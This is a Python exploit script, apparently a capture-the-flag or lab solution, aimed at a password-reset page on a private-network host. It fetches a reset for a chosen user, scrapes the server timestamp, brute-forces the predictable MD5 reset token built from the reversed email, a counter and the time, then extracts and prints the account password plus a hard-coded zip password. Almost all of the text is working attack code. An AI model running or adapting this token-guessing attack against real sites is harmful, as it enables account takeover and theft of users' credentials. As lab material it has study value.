import requests
import datetime
import hashlib
import re

#dt = "10:37:42 16/03/2023"
#10:50:07 16/03/2023
target = "10.102.68.178"
user = "61qwfZ"

r = requests.get("http://{}/forgot.php?email={}@secure-chat.co.uk".format(target, user))
print(r.text)



#18:16:41 16/03/2023

dt = re.search("\d{2}.\d{2}.\d{2}.\d{2}.\d{2}.\d{4}", r.text)[0]
dt = datetime.datetime.strptime(dt, "%H:%M:%S %d/%m/%Y").strftime("%s")
print(dt)



for i in range(100):
    unencoded = "{}@secure-chat.co.uk".format(user).upper()[::-1] + str(i) + str(dt)
    m = hashlib.md5()
    m.update(unencoded.encode('utf-8'))
    r = requests.get("http://{}/forgot.php?resetID={}".format(target, str(m.hexdigest())))
    if len(r.text) != 3587:
        #print(r.text)
        password = re.search("<b>.{16}<\/b>", r.text)[0].replace("<b>", "").replace("</b>", "")
        print("{}@secure-chat.co.uk".format(user))
        print(password)
        print("to download zip: 0n_600d_7r4ck")
        #quit()

